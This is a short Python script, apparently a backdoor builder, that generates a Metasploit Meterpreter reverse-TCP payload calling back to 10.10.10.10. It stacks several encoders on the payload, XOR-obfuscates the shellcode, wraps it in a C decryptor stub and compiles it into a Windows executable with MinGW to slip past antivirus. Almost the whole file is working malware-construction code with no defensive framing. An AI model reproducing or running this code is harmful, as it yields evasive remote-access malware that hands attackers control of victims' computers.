from struct import *
import os
src_raw = "temp.raw"
out_c = "temp3.c"
decrypt_shell = "decrypt.c"
mingw = {
        '32':"/opt/mingw32/bin/i686-w64-mingw32-gcc",
        '64':"/opt/mingw64/bin/x86_64-w64-mingw32-gcc"
}
out_base = "a_%s.exe"
key = 0x42
cb_ip = "10.10.10.10"
cb_port = {
    '32':"8080",
    '64':"8081"
}

msf_cmd = {
        "32":"./msfpayload windows/meterpreter/reverse_tcp_dns LHOST=%s LPORT=%s R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -e x86/shikata_ga_nai -c 6 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (cb_ip,cb_port["32"],os.path.join(os.getcwd(),src_raw)), 
        "64":"./msfpayload windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s R | ./msfencode -t raw -e x64/xor -c 8 -o %s" % (cb_ip,cb_port["64"],os.path.join(os.getcwd(),src_raw))
}

def make_bd_exe(arch):
        
    os.system(msf_cmd[arch])
    
    f = open(src_raw,"rb")
    o = open(out_c,"w")

    raw_sc = f.read()
    temp = []
    sc = []
    
    pre_loop = "//printf('Entering loop');\n"
    pre_enc = "//do nothing"
    enc = "tmp[i]=sc[i]^key;\n"
    post_enc = "//do nothing\n"
    post_loop = "//do nothing\n"
    post_func = "//do nothing\n"
 
    for i in xrange(0,len(raw_sc)):
        temp.append(unpack("B",raw_sc[i])[0]^key)
    for i in range(0,len(temp)):
        temp[i]="\\x%x"%temp[i]
    for i in range(0,len(temp),15):
        sc.append('\n"'+"".join(temp[i:i+15])+"\"")
    sc = "".join(sc)
    
    outline = open(decrypt_shell).read()
    code = outline % (sc,key,len(raw_sc),pre_loop,pre_enc,enc,post_enc,post_loop,post_func)
    o.write(code)
    o.flush()
    os.system("%s -o %s %s" % (mingw[arch],out_base%arch,out_c))

if __name__=="__main__":
    make_bd_exe("32")
    #make_bd_exe("64")
    
